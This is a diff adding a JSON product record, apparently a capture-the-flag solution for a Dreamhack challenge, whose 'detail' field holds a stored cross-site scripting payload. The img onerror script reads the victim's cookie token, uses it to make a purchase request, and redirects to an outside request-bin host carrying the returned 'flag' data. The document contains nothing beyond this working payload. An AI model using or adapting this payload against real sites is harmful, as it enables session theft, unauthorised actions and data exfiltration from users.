@@ -1,0 +1,7 @@
+{
+  "id": 1,
+  "name": "evil",
+  "price": 1,
+  "detail": "<img src=x onerror=\"fetch('/4/buy',{method:'POST',headers:{'token':document.cookie.split('=')[1],'Content-Type':'application/json'}}).then(r=>r.json()).then(d=>location='https://ptmdzqh.request.dreamhack.games/?flag='+d.data)\">",
+  "poster": "x"
+}
